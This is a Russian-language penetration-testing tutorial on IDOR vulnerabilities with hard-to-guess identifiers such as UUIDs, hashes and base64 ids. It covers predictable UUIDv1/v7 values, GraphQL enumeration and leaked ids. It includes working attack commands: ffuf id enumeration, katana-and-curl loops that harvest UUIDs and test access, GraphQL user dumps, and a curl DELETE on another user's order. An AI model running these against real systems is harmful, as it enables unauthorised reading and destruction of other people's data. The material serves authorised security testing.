IDOR на «сложных» идентификаторах (UUID, opaque id, хеши) — отдельная тема, потому что многие ошибочно считают: «id непредсказуем → IDOR невозможен». На деле непредсказуемость защищает только от **слепого перебора**; если идентификатор где-то утекает или API отдаёт его по другому запросу, IDOR остаётся. Плюс существуют предсказуемые UUID (v1/v7) и enumeration через GraphQL/поиск.

## Теория: какие ID реально предсказуемы

| Тип ID | Предсказуемость | Комментарий |
|--------|-----------------|-------------|
| Последовательный int | высокая | тривиальный перебор |
| UUIDv4 | низкая (случайный) | перебор нереален |
| UUIDv1 | высокая | timestamp + MAC/node |
| UUIDv7 | средняя | timestamp-префикс |
| ULID | средняя | timestamp-префикс |
| Хеш от email/id | зависит | если хеш без соли — перебирается |
| Base64 от int | высокая | декодируется в int |
| Opaque id | зависит от энтропии | если короткий/предсказуемый — перебор |

Ключевой принцип: **IDOR — про отсутствие проверки авторизации**, а не про формат id. Непредсказуемый id лишь затрудняет поиск объекта.

## Вектор 1: тривиальный перебор

Если id — int или base64 от int:

```bash
# base64 от 1001 = MTAwMQ== -> декодируем и меняем
echo 'MTAwMQ==' | base64 -d     # 1001
echo -n '1002' | base64         # MTAwMg==
```

Прогон по диапазону — через `ffuf` с payload-списком id (не shell-цикл):

```bash
seq 1 5000 > /tmp/ids.txt
ffuf -w /tmp/ids.txt -u "https://app.example/api/orders/FUZZ" -H "Authorization: Bearer $TOKEN" -mc 200 -fs 0
```

## Вектор 2: UUIDv1/v7 предиктивность

UUIDv1 содержит 60-битный timestamp (в 100-нс интервалах с 1582-10-15) + node (MAC). Зная время создания объекта, можно восстановить UUID. Инструменты: `uuid-timestamp`, скрипты на Python.

```python
# концепт: из известного UUIDv1 вытащить timestamp и node
import uuid
u = uuid.UUID('f81d4fae-7dec-11d0-a765-00a0c91e6bf6')
print(u.time, u.node)   # time -> восстановить соседние id
```

UUIDv7/ULID начинаются с timestamp — перебор в узком окне времени реален.

## Вектор 3: enumeration через API/GraphQL

Часто API отдаёт объекты списком или по поиску, где можно узнать чужие id:

- `GET /api/users?search=a` → возвращает id всех.
- GraphQL: запрос списка/`node(id:)` без проверки владельца.
- Экспорт CSV/отчёта со всеми id.
- Автодополнение (`/suggest?q=`) отдаёт id.

```graphql
{ users { id email } }
{ node(id: "VXNlcjoxMjM=") { ... on User { email } } }
```

## Вектор 4: утечки ID

- Ссылки в письмах/уведомлениях (порядковый номер, id объекта).
- Логи/ошибки (id в стектрейсе).
- Метаданные файлов/картинок (EXIF).
- Публичные страницы (профиль, отзыв) содержат id.
- JS-код с захардкоженными id.

## Разобранный пример: IDOR на UUID через GraphQL

Шаг 1 — получаем свой объект:

```graphql
query { me { orders { id } } }
```

Шаг 2 — пробуем запросить чужой (id из утечки/enumeration):

```graphql
query { order(id: "7f9c2ba4-...-chuzhoy") { total items } }
```

Шаг 3 — если вернулся чужой заказ — IDOR/BOLA. GraphQL особенно опасен: одна ручка `order(id:)` без проверки владельца даёт доступ ко всем.

## Разобранный пример: UUIDv1 предсказание

Шаг 1 — получаем свой UUIDv1 и время создания объекта.
Шаг 2 — вычисляем timestamp/node.
Шаг 3 — генерируем соседние UUID (в окне времени) и перебираем через `ffuf`.
Шаг 4 — находим чужие объекты.

## Методология теста

1. Соберите два своих объекта, посмотрите, как меняется id.
2. Проверьте, отдаёт ли API чужие id (enumeration).
3. Попробуйте доступ к чужому id с валидным, но не владельческим токеном.
4. Тестируйте не только `GET`, но `PUT`/`DELETE`/`PATCH` (write-IDOR опаснее).
5. Проверьте вложенные ресурсы (`/orders/1/items/2`).

## Инструменты

- **Burp Intruder/`ffuf`** — перебор id.
- **`Autorize`** (Burp) — авто-проверка авторизации на всех запросах.
- **`uuid-timestamp`/Python** — предсказание UUIDv1.
- **`graphql-cop`/`clairvoyance`** — enumeration GraphQL.

## Что дальше / decision

1. Есть id в API → соберите свои объекты, проверьте изменение.
2. API отдаёт списки → enumeration чужих id.
3. UUIDv1/v7 → попробуйте предсказание.
4. Нашли чужой id → проверьте `GET`/`PUT`/`DELETE`.
5. Дальше — эскалация (write-IDOR → изменение/удаление чужих данных).

## Частые ошибки

- **Считать UUID защитой от IDOR.** Это лишь непредсказуемость.
- **Тестировать только `GET`.** Write-IDOR опаснее.
- **Игнорировать GraphQL.** `node(id:)` часто без authz.
- **Не искать утечки id.** Они повсюду (письма, списки, JS).
- **Ломать прод.** Write-IDOR — только с согласия.

## UUIDv4: почему он не спасает

Многие считают UUID защитой от IDOR, потому что его «нельзя угадать». Это заблуждение по трём причинам. Во-первых, **UUID утекает**: в ответах API, в HTML, в JS-бандлах, в письмах, в логах, в публичных ссылках. Найдя один чужой UUID, вы получаете доступ к объекту. Во-вторых, **UUID бывает предсказуемым**: v1 основан на времени и MAC-адресе, v7 — на времени; их можно предсказать, зная несколько значений. В-третьих, **приложение может использовать UUID как идентификатор, но не проверять владение** — тогда утечка UUID = доступ.

```bash
# ищем UUID в ответах и JS
curl -s https://t/api/me | jq -r '..|strings' | grep -iE '[0-9a-f]{8}-[0-9a-f]{4}-'
katana -u https://t -jc -silent | while read u; do curl -s "$u"; done | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
```

## UUIDv1/v7: предсказание

UUIDv1 содержит временную метку (100-нс интервалы с 1582 года) и, часто, MAC-адрес. Если приложение использует v1, по нескольким наблюдаемым UUID можно вычислить временную базу и предсказать соседние. UUIDv7 — тоже time-based (millisecond precision + random). Инструменты: `uuidtools`, скрипты на Python.

```python
# пример: извлечь timestamp из UUIDv1
import uuid, datetime
u = uuid.UUID('c9c0e0d0-...-...-...-...')
print(datetime.datetime(1582,10,15) + datetime.timedelta(microseconds=u.time//10))
```

## Инструменты перебора и корреляции

Для IDOR на UUID нужен не перебор (пространство огромно), а **утечка** и **корреляция**. Собирайте UUID из всех источников: API-ответы, JS, публичные страницы, письма, шары. Затем проверяйте каждый на доступ. Для числовых ID — перебор (`ffuf`).

```bash
# собрать все UUID из цели
katana -u https://t -jc -silent | while read u; do curl -s "$u"; done \
  | grep -oE '[0-9a-f-]{36}' | sort -u > uuids.txt
# проверить доступ к каждому
while read id; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -b jar "https://t/api/orders/$id")
  [ "$code" = "200" ] && echo "ACCESS: $id"
done < uuids.txt
```

## Что делать дальше / решение

Не считайте UUID защитой. Ищите утечки (JS, API, письма), проверяйте предсказуемость (v1/v7), и главное — проверяйте **авторизацию** на уровне объекта: если сервер не проверяет владение, любой известный UUID даёт доступ. Доводите до артефакта (чужие данные) и фиксируйте, откуда утёк UUID.

## Методология теста IDOR на любой идентификатор

Независимо от типа ID (число, UUID, slug, составной), методология одна. Первое — **найдите все места**, где ID передаётся: путь (`/orders/123`), query (`?id=123`), тело (`{"order_id":123}`), заголовок (`X-Order-Id: 123`), cookie. Второе — **определите свой ID** (создайте объект, посмотрите значение). Третье — **подставьте чужой**: соседний (`124`), из другого источника, из утечки. Четвёртое — **сравните ответ**: чужой объект отличается от своего? Пятое — **проверьте методы**: иногда `GET` защищён, а `PUT`/`DELETE` нет. Шестое — **проверьте вложенность**: `/teams/1/members/2` — проверка часто только на `1`.

```bash
# свой объект
curl -s -b jar https://t/api/orders/1001 | jq -r '.user'
# чужой
curl -s -b jar https://t/api/orders/1002 | jq -r '.user'
# другой метод
curl -s -b jar -X DELETE https://t/api/orders/1002
# вложенный
curl -s -b jar https://t/api/teams/1/members/999 | jq -r '.email'
```

## Сравнение ответов: как не обмануться

Важно отличать «чужой объект» от «своего». Приложение может вернуть `200` с пустым объектом, с объектом-заглушкой или с вашим объектом (если ID игнорируется). Сравнивайте: `user_id`, `email`, `owner`, `created_at`. Если поле владельца отличается от вашего — это IDOR. Если совпадает — возможно, вы получили свой объект, и это не находка.

```bash
# diff владельца
for id in 1001 1002 1003; do
  echo -n "$id -> "; curl -s -b jar "https://t/api/orders/$id" | jq -r '.user.email // "none"'
done
```

## Как искать объекты для IDOR

Источники ID: создание объекта (вернулся ID), публичные страницы (профили, посты), API-ответы (списки), JS-бандлы, sitemap, письма, шары, логи. Для числовых ID — соседние значения. Для UUID — только утечки. Для slug — словари и корреляция. Начните с создания двух объектов и поиска различий.

## Что делать дальше / решение

Систематически проверяйте IDOR на всех идентификаторах и методах, отличайте чужой объект от своего, доводите до артефакта (чужие данные). Если ID непредсказуем, ищите утечки. Если прямой IDOR закрыт, проверьте вложенные ресурсы и массовые операции (список объектов другого пользователя). И фиксируйте точный запрос, доказывающий доступ.
